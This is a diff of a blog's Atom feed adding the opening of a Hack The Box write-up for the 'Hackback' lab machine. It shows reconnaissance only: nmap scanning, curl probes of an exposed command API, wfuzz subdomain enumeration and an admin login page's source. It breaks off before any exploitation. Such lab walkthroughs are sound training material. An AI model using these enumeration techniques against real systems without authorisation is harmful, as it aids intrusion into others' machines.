@@ -1,4 +1,1083 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-01T21:42:40+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Netmon</title><link href="http://localhost:4000/hack-the-box/netmon/" rel="alternate" type="text/html" title="Hack The Box - Netmon" /><published>2019-06-29T00:00:00+02:00</published><updated>2019-06-29T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/netmon</id><content type="html" xml:base="http://localhost:4000/hack-the-box/netmon/">&lt;hr /&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2019-07-06T16:20:16+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">0xRick Owned Root !</title><subtitle>Infosec Blog , CTF and Hack The Box write-ups , articles and other stuff</subtitle><entry><title type="html">Hack The Box - Hackback</title><link href="http://localhost:4000/hack-the-box/hackback/" rel="alternate" type="text/html" title="Hack The Box - Hackback" /><published>2019-07-06T00:00:00+02:00</published><updated>2019-07-06T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/hackback</id><content type="html" xml:base="http://localhost:4000/hack-the-box/hackback/">&lt;hr /&gt;
+
+&lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
+&lt;h4 id=&quot;hey-guys-today-hackback-retired-and-heres-my-write-up-about-it-hackback-was-a-very-hard-machine-full-of-different-steps-and-rabbit-holes-its-a-windows-machine-and-its-ip-is-101010128-i-added-it-to-etchosts-as-hackbackhtb-lets-jump-right-in-&quot;&gt;Hey guys today Hackback retired and here’s my write-up about it. Hackback was a very hard machine full of different steps and rabbit holes. It’s a Windows machine and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.128&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;hackback.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/0.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;nmap&quot;&gt;Nmap&lt;/h3&gt;
+&lt;h4 id=&quot;as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-&quot;&gt;As always we will start with &lt;code class=&quot;highlighter-rouge&quot;&gt;nmap&lt;/code&gt; to scan for open ports and services :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sV -sT -sC hackback.htb&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/hackback/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;we-got-two-http-ports-80-and-6666-i-also-ran-a-full-scan-but-well-get-to-that-later&quot;&gt;We got two &lt;code class=&quot;highlighter-rouge&quot;&gt;http&lt;/code&gt; ports, 80 and 6666, I also ran a full scan but we’ll get to that later.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;hr /&gt;
+
+&lt;h3 id=&quot;http&quot;&gt;HTTP&lt;/h3&gt;
+&lt;h4 id=&quot;i-checked-both-ports-on-80-there-was-this-donkey-image-&quot;&gt;I checked both ports, on 80 there was this donkey image :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;i-ran-gobuster-and-it-got-nothing&quot;&gt;I ran &lt;code class=&quot;highlighter-rouge&quot;&gt;gobuster&lt;/code&gt; and it got nothing.&lt;/h4&gt;
+&lt;h4 id=&quot;i-couldnt-send-a-request-to-port-6666-from-the-browser-so-i-used-curl-&quot;&gt;I couldn’t send a request to port 6666 from the browser so I used curl :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/ 
+&quot;Missing Command!&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;it-says-missing-command&quot;&gt;It says &lt;code class=&quot;highlighter-rouge&quot;&gt;&quot;Missing Command!&quot;&lt;/code&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;so-i-tried-help-&quot;&gt;So I tried &lt;code class=&quot;highlighter-rouge&quot;&gt;/help&lt;/code&gt; :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/help
+&quot;hello,proc,whoami,list,info,services,netsat,ipconfig&quot;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;it-returned-a-list-of-what-commands-we-can-use-whoami-lists-information-about-the-user-running-this-service-not-really-important-list-lists-the-files-in-the-current-directory-&quot;&gt;It returned a list of what commands we can use. &lt;code class=&quot;highlighter-rouge&quot;&gt;/whoami&lt;/code&gt; lists information about the user running this service, not really important. &lt;code class=&quot;highlighter-rouge&quot;&gt;/list&lt;/code&gt; lists the files in the current directory :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/list
+[
+    {
+        &quot;Name&quot;:  &quot;aspnet_client&quot;,
+        &quot;length&quot;:  null
+    },
+    {
+        &quot;Name&quot;:  &quot;default&quot;,
+        &quot;length&quot;:  null
+    },
+    {
+        &quot;Name&quot;:  &quot;new_phish&quot;,
+        &quot;length&quot;:  null
+    },
+    {
+        &quot;Name&quot;:  &quot;http.ps1&quot;,
+        &quot;Length&quot;:  1867
+    },
+    {
+        &quot;Name&quot;:  &quot;iisstart.htm&quot;,
+        &quot;Length&quot;:  703
+    },
+    {
+        &quot;Name&quot;:  &quot;iisstart.png&quot;,
+        &quot;Length&quot;:  99710
+    }
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;info-prints-system-information-we-might-need-that-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/info&lt;/code&gt; prints system information, we might need that :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/info
+{
+    &quot;WindowsBuildLabEx&quot;:  &quot;17763.1.amd64fre.rs5_release.180914-1434&quot;,
+    &quot;WindowsCurrentVersion&quot;:  &quot;6.3&quot;,
+    &quot;WindowsEditionId&quot;:  &quot;ServerStandard&quot;,
+    &quot;WindowsInstallationType&quot;:  &quot;Server&quot;,
+    &quot;WindowsInstallDateFromRegistry&quot;:  &quot;\/Date(1542436874000)\/&quot;,
+    &quot;WindowsProductId&quot;:  &quot;00429-00520-27817-AA520&quot;,
+    &quot;WindowsProductName&quot;:  &quot;Windows Server 2019 Standard&quot;,
+    &quot;WindowsRegisteredOrganization&quot;:  &quot;&quot;,
+    &quot;WindowsRegisteredOwner&quot;:  &quot;Windows User&quot;,
+    &quot;WindowsSystemRoot&quot;:  &quot;C:\\Windows&quot;,
+    &quot;WindowsVersion&quot;:  &quot;1809&quot;,
+    &quot;BiosCharacteristics&quot;:  null,
+    &quot;BiosBIOSVersion&quot;:  null,
+    &quot;BiosBuildNumber&quot;:  null,
+    &quot;BiosCaption&quot;:  null,
+    &quot;BiosCodeSet&quot;:  null,
+    &quot;BiosCurrentLanguage&quot;:  null,
+    &quot;BiosDescription&quot;:  null,
+    &quot;BiosEmbeddedControllerMajorVersion&quot;:  null,
+    &quot;BiosEmbeddedControllerMinorVersion&quot;:  null,
+    &quot;BiosFirmwareType&quot;:  null,
+    &quot;BiosIdentificationCode&quot;:  null,
+    &quot;BiosInstallableLanguages&quot;:  null,
+    &quot;BiosInstallDate&quot;:  null,
+    &quot;BiosLanguageEdition&quot;:  null,
+    &quot;BiosListOfLanguages&quot;:  null,
+    &quot;BiosManufacturer&quot;:  null,
+    &quot;BiosName&quot;:  null,
+    &quot;BiosOtherTargetOS&quot;:  null,
+    &quot;BiosPrimaryBIOS&quot;:  null,
+    &quot;BiosReleaseDate&quot;:  null,
+    &quot;BiosSeralNumber&quot;:  null,
+    &quot;BiosSMBIOSBIOSVersion&quot;:  null,
+    &quot;BiosSMBIOSMajorVersion&quot;:  null,
+    &quot;BiosSMBIOSMinorVersion&quot;:  null,
+    &quot;BiosSMBIOSPresent&quot;:  null,
+    &quot;BiosSoftwareElementState&quot;:  null,
+    &quot;BiosStatus&quot;:  null,
+    &quot;BiosSystemBiosMajorVersion&quot;:  null,
+    &quot;BiosSystemBiosMinorVersion&quot;:  null,
+    &quot;BiosTargetOperatingSystem&quot;:  null,
+    &quot;BiosVersion&quot;:  null,
+    &quot;CsAdminPasswordStatus&quot;:  null,
+    &quot;CsAutomaticManagedPagefile&quot;:  null,
+    &quot;CsAutomaticResetBootOption&quot;:  null,
+    &quot;CsAutomaticResetCapability&quot;:  null,
+    &quot;CsBootOptionOnLimit&quot;:  null,
+    &quot;CsBootOptionOnWatchDog&quot;:  null,
+    &quot;CsBootROMSupported&quot;:  null,
+    &quot;CsBootStatus&quot;:  null,
+    &quot;CsBootupState&quot;:  null,
+    &quot;CsCaption&quot;:  null,
+    &quot;CsChassisBootupState&quot;:  null,
+    &quot;CsChassisSKUNumber&quot;:  null,
+    &quot;CsCurrentTimeZone&quot;:  null,
+    &quot;CsDaylightInEffect&quot;:  null,
+    &quot;CsDescription&quot;:  null,
+    &quot;CsDNSHostName&quot;:  null,
+    &quot;CsDomain&quot;:  null,
+    &quot;CsDomainRole&quot;:  null,
+    &quot;CsEnableDaylightSavingsTime&quot;:  null,
+    &quot;CsFrontPanelResetStatus&quot;:  null,
+    &quot;CsHypervisorPresent&quot;:  null,
+    &quot;CsInfraredSupported&quot;:  null,
+    &quot;CsInitialLoadInfo&quot;:  null,
+    &quot;CsInstallDate&quot;:  null,
+    &quot;CsKeyboardPasswordStatus&quot;:  null,
+    &quot;CsLastLoadInfo&quot;:  null,
+    &quot;CsManufacturer&quot;:  null,
+    &quot;CsModel&quot;:  null,
+    &quot;CsName&quot;:  null,
+    &quot;CsNetworkAdapters&quot;:  null,
+    &quot;CsNetworkServerModeEnabled&quot;:  null,
+    &quot;CsNumberOfLogicalProcessors&quot;:  null,
+    &quot;CsNumberOfProcessors&quot;:  null,
+    &quot;CsProcessors&quot;:  null,
+    &quot;CsOEMStringArray&quot;:  null,
+    &quot;CsPartOfDomain&quot;:  null,
+    &quot;CsPauseAfterReset&quot;:  null,
+    &quot;CsPCSystemType&quot;:  null,
+    &quot;CsPCSystemTypeEx&quot;:  null,
+    &quot;CsPowerManagementCapabilities&quot;:  null,
+    &quot;CsPowerManagementSupported&quot;:  null,
+    &quot;CsPowerOnPasswordStatus&quot;:  null,
+    &quot;CsPowerState&quot;:  null,
+    &quot;CsPowerSupplyState&quot;:  null,
+    &quot;CsPrimaryOwnerContact&quot;:  null,
+    &quot;CsPrimaryOwnerName&quot;:  null,
+    &quot;CsResetCapability&quot;:  null,
+    &quot;CsResetCount&quot;:  null,
+    &quot;CsResetLimit&quot;:  null,
+    &quot;CsRoles&quot;:  null,
+    &quot;CsStatus&quot;:  null,
+    &quot;CsSupportContactDescription&quot;:  null,
+    &quot;CsSystemFamily&quot;:  null,
+    &quot;CsSystemSKUNumber&quot;:  null,
+    &quot;CsSystemType&quot;:  null,
+    &quot;CsThermalState&quot;:  null,
+    &quot;CsTotalPhysicalMemory&quot;:  null,
+    &quot;CsPhyicallyInstalledMemory&quot;:  null,
+    &quot;CsUserName&quot;:  null,
+    &quot;CsWakeUpType&quot;:  null,
+    &quot;CsWorkgroup&quot;:  null,
+    &quot;OsName&quot;:  null,
+    &quot;OsType&quot;:  null,
+    &quot;OsOperatingSystemSKU&quot;:  null,
+    &quot;OsVersion&quot;:  null,
+    &quot;OsCSDVersion&quot;:  null,
+    &quot;OsBuildNumber&quot;:  null,
+    &quot;OsHotFixes&quot;:  null,
+    &quot;OsBootDevice&quot;:  null,
+    &quot;OsSystemDevice&quot;:  null,
+    &quot;OsSystemDirectory&quot;:  null,
+    &quot;OsSystemDrive&quot;:  null,
+    &quot;OsWindowsDirectory&quot;:  null,
+    &quot;OsCountryCode&quot;:  null,
+    &quot;OsCurrentTimeZone&quot;:  null,
+    &quot;OsLocaleID&quot;:  null,
+    &quot;OsLocale&quot;:  null,
+    &quot;OsLocalDateTime&quot;:  null,
+    &quot;OsLastBootUpTime&quot;:  null,
+    &quot;OsUptime&quot;:  null,
+    &quot;OsBuildType&quot;:  null,
+    &quot;OsCodeSet&quot;:  null,
+    &quot;OsDataExecutionPreventionAvailable&quot;:  null,
+    &quot;OsDataExecutionPrevention32BitApplications&quot;:  null,
+    &quot;OsDataExecutionPreventionDrivers&quot;:  null,
+    &quot;OsDataExecutionPreventionSupportPolicy&quot;:  null,
+    &quot;OsDebug&quot;:  null,
+    &quot;OsDistributed&quot;:  null,
+    &quot;OsEncryptionLevel&quot;:  null,
+    &quot;OsForegroundApplicationBoost&quot;:  null,
+    &quot;OsTotalVisibleMemorySize&quot;:  null,
+    &quot;OsFreePhysicalMemory&quot;:  null,
+    &quot;OsTotalVirtualMemorySize&quot;:  null,
+    &quot;OsFreeVirtualMemory&quot;:  null,
+    &quot;OsInUseVirtualMemory&quot;:  null,
+    &quot;OsTotalSwapSpaceSize&quot;:  null,
+    &quot;OsSizeStoredInPagingFiles&quot;:  null,
+    &quot;OsFreeSpaceInPagingFiles&quot;:  null,
+    &quot;OsPagingFiles&quot;:  null,
+    &quot;OsHardwareAbstractionLayer&quot;:  null,
+    &quot;OsInstallDate&quot;:  null,
+    &quot;OsManufacturer&quot;:  null,
+    &quot;OsMaxNumberOfProcesses&quot;:  null,
+    &quot;OsMaxProcessMemorySize&quot;:  null,
+    &quot;OsMuiLanguages&quot;:  null,
+    &quot;OsNumberOfLicensedUsers&quot;:  null,
+    &quot;OsNumberOfProcesses&quot;:  null,
+    &quot;OsNumberOfUsers&quot;:  null,
+    &quot;OsOrganization&quot;:  null,
+    &quot;OsArchitecture&quot;:  null,
+    &quot;OsLanguage&quot;:  null,
+    &quot;OsProductSuites&quot;:  null,
+    &quot;OsOtherTypeDescription&quot;:  null,
+    &quot;OsPAEEnabled&quot;:  null,
+    &quot;OsPortableOperatingSystem&quot;:  null,
+    &quot;OsPrimary&quot;:  null,
+    &quot;OsProductType&quot;:  null,
+    &quot;OsRegisteredUser&quot;:  null,
+    &quot;OsSerialNumber&quot;:  null,
+    &quot;OsServicePackMajorVersion&quot;:  null,
+    &quot;OsServicePackMinorVersion&quot;:  null,
+    &quot;OsStatus&quot;:  null,
+    &quot;OsSuites&quot;:  null,
+    &quot;OsServerLevel&quot;:  4,
+    &quot;KeyboardLayout&quot;:  null,
+    &quot;TimeZone&quot;:  &quot;(UTC-08:00) Pacific Time (US \u0026 Canada)&quot;,
+    &quot;LogonServer&quot;:  null,
+    &quot;PowerPlatformRole&quot;:  1,
+    &quot;HyperVisorPresent&quot;:  null,
+    &quot;HyperVRequirementDataExecutionPreventionAvailable&quot;:  null,
+    &quot;HyperVRequirementSecondLevelAddressTranslation&quot;:  null,
+    &quot;HyperVRequirementVirtualizationFirmwareEnabled&quot;:  null,
+    &quot;HyperVRequirementVMMonitorModeExtensions&quot;:  null,
+    &quot;DeviceGuardSmartStatus&quot;:  0,
+    &quot;DeviceGuardRequiredSecurityProperties&quot;:  null,
+    &quot;DeviceGuardAvailableSecurityProperties&quot;:  null,
+    &quot;DeviceGuardSecurityServicesConfigured&quot;:  null,
+    &quot;DeviceGuardSecurityServicesRunning&quot;:  null,
+    &quot;DeviceGuardCodeIntegrityPolicyEnforcementStatus&quot;:  null,
+    &quot;DeviceGuardUserModeCodeIntegrityPolicyEnforcementStatus&quot;:  null
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;services-lists-the-services-thats-also-important-and-we-might-need-it-later-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/services&lt;/code&gt; lists the services, that’s also important and we might need it later :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# curl http://hackback.htb:6666/services
+[
+    {
+        &quot;name&quot;:  &quot;AJRouter&quot;,
+        &quot;startname&quot;:  &quot;NT AUTHORITY\\LocalService&quot;,
+        &quot;displayname&quot;:  &quot;AllJoyn Router Service&quot;,
+        &quot;status&quot;:  &quot;OK&quot;
+    },
+    {
+        &quot;name&quot;:  &quot;ALG&quot;,
+        &quot;startname&quot;:  &quot;NT AUTHORITY\\LocalService&quot;,
+        &quot;displayname&quot;:  &quot;Application Layer Gateway Service&quot;,
+        &quot;status&quot;:  &quot;OK&quot;
+    },
+    {
+        &quot;name&quot;:  &quot;AppHostSvc&quot;,
+        &quot;startname&quot;:  &quot;localSystem&quot;,
+        &quot;displayname&quot;:  &quot;Application Host Helper Service&quot;,
+        &quot;status&quot;:  &quot;OK&quot;
+    },
+
+    -------------------
+    Removed Long Output
+    -------------------
+    
+    {
+        &quot;name&quot;:  &quot;WpnService&quot;,
+        &quot;startname&quot;:  &quot;LocalSystem&quot;,
+        &quot;displayname&quot;:  &quot;Windows Push Notifications System Service&quot;,
+        &quot;status&quot;:  &quot;OK&quot;
+    },
+    {
+        &quot;name&quot;:  &quot;WSearch&quot;,
+        &quot;startname&quot;:  &quot;LocalSystem&quot;,
+        &quot;displayname&quot;:  &quot;Windows Search&quot;,
+        &quot;status&quot;:  &quot;OK&quot;
+    },
+    {
+        &quot;name&quot;:  &quot;wuauserv&quot;,
+        &quot;startname&quot;:  &quot;LocalSystem&quot;,
+        &quot;displayname&quot;:  &quot;Windows Update&quot;,
+        &quot;status&quot;:  &quot;OK&quot;
+    }
+]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;netstat-lists-the-listening-ports-we-can-check-that-when-we-need-to-know-about-some-internal-services-but-for-now-we-will-just-ignore-it-the-rest-of-the-commands-are-not-really-doing-anything-useful-i-tried-to-exploit-this-service-since-its-executing-system-commands-however-it-wasnt-possible&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/netstat&lt;/code&gt; lists the listening ports, we can check that when we need to know about some internal services but for now we will just ignore it. The rest of the commands are not really doing anything useful. I tried to exploit this service since it’s executing system commands, however it wasn’t possible.&lt;/h4&gt;
+&lt;h4 id=&quot;i-used-wfuzz-with-subdomains-top1million-5000txt-from-seclists-to-enumerate-any-possible-subdomains-&quot;&gt;I used &lt;code class=&quot;highlighter-rouge&quot;&gt;wfuzz&lt;/code&gt; with &lt;a href=&quot;https://github.com/danielmiessler/SecLists/blob/master/Discovery/DNS/subdomains-top1million-5000.txt&quot;&gt;subdomains-top1million-5000.txt&lt;/a&gt; from &lt;a href=&quot;https://github.com/danielmiessler/SecLists&quot;&gt;seclists&lt;/a&gt; to enumerate any possible subdomains :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/Desktop/HTB/boxes/hackback# wfuzz --hc 614 -c -w subdomains-top1mil-5000.txt -H &quot;HOST: FUZZ.hackback.htb&quot; http://10.10.10.128
+
+Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+
+*****
+* Wfuzz 2.3.4 - The Web Fuzzer                         *
+*****                              
+Target: http://10.10.10.128/
+Total requests: 4997
+
+==================================================================
+ID   Response   Lines      Word         Chars          Payload
+==================================================================
+
+000007:  C=200     33 L       54 W          614 Ch        &quot;webdisk&quot;
+000008:  C=200     33 L       54 W          614 Ch        &quot;pop&quot;
+000001:  C=200     33 L       54 W          614 Ch        &quot;www&quot;
+000002:  C=200     33 L       54 W          614 Ch        &quot;mail&quot;
+000005:  C=200     33 L       54 W          614 Ch        &quot;webmail&quot;
+000006:  C=200     33 L       54 W          614 Ch        &quot;smtp&quot;
+000009:  C=200     33 L       54 W          614 Ch        &quot;cpanel&quot;
+000010:  C=200     33 L       54 W          614 Ch        &quot;whm&quot;
+000003:  C=200     33 L       54 W          614 Ch        &quot;ftp&quot;
+000004:  C=200     33 L       54 W          614 Ch        &quot;localhost&quot;
+000011:  C=200     33 L       54 W          614 Ch        &quot;ns1&quot;
+000013:  C=200     33 L       54 W          614 Ch        &quot;autodiscover&quot;
+000014:  C=200     33 L       54 W          614 Ch        &quot;autoconfig&quot;
+000015:  C=200     33 L       54 W          614 Ch        &quot;ns&quot;
+000016:  C=200     33 L       54 W          614 Ch        &quot;test&quot;
+000012:  C=200     33 L       54 W          614 Ch        &quot;ns2&quot;
+000017:  C=200     33 L       54 W          614 Ch        &quot;m&quot;
+000020:  C=200     33 L       54 W          614 Ch        &quot;www2&quot;
+000021:  C=200     33 L       54 W          614 Ch        &quot;ns3&quot;
+000018:  C=200     33 L       54 W          614 Ch        &quot;blog&quot;
+000019:  C=200     33 L       54 W          614 Ch        &quot;dev&quot;
+000023:  C=200     33 L       54 W          614 Ch        &quot;forum&quot;
+000022:  C=200     33 L       54 W          614 Ch        &quot;pop3&quot;
+000026:  C=200     33 L       54 W          614 Ch        &quot;vpn&quot;
+000025:  C=200     33 L       54 W          614 Ch        &quot;mail2&quot;
+000024:  C=200     27 L       66 W          825 Ch        &quot;admin&quot;
+000027:  C=200     33 L       54 W          614 Ch        &quot;mx&quot;
+
+^C 
+Finishing pending requests...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;admin-gave-a-different-response-length-i-added-it-to-etchosts-&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;admin&lt;/code&gt; gave a different response length, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;it-had-this-login-form-&quot;&gt;It had this login form :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;which-actually-didnt-do-anything-&quot;&gt;Which actually didn’t do anything :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&amp;lt;form action=&quot;#&quot; method=&quot;post&quot;&amp;gt;
+    &amp;lt;!-- USERNAME INPUT --&amp;gt;
+    &amp;lt;label for=&quot;username&quot;&amp;gt;Username&amp;lt;/label&amp;gt;
+    &amp;lt;input type=&quot;text&quot; placeholder=&quot;Enter Username&quot;&amp;gt;
+    &amp;lt;!-- PASSWORD INPUT --&amp;gt;
+    &amp;lt;label for=&quot;password&quot;&amp;gt;Password&amp;lt;/label&amp;gt;
+    &amp;lt;input type=&quot;password&quot; placeholder=&quot;Enter Password&quot;&amp;gt;
+    &amp;lt;input type=&quot;submit&quot; value=&quot;Log In&quot;&amp;gt;
+    &amp;lt;a href=&quot;lost&quot;&amp;gt;Lost your Password?&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
+    &amp;lt;a href=&quot;signup&quot;&amp;gt;Don't have An account?&amp;lt;/a&amp;gt;
+&amp;lt;/form&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;also-the-password-reset-and-sign-up-pages-are-non-existent-&quot;&gt;Also the password reset and sign-up pages are non-existent :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/hackback/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;by-looking-at-the-page-source-&quot;&gt;By looking at the page source :&lt;/h4&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE html&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;head&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;meta&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;charset=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;utf-8&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Admin Login&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;link&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;rel=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;stylesheet&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;href=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/css/master.css&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;script SRC=&quot;js/.js&quot;&amp;gt;&amp;lt;/script&amp;gt; --&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
+
+    &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;login-box&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;img/logo.png&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;avatar&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;alt=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Avatar Image&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Login Here&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;form&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;action=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;method=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;post&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- USERNAME INPUT --&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;label&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;for=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;Username&lt;span class=&quot;nt&quot;&gt;&amp;lt;/label&amp;gt;&lt;/span&gt;
+        &lt;span class=&quot;nt&quot;&gt;&amp;lt;input&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;type=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;text&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;placeholder=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter Username&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
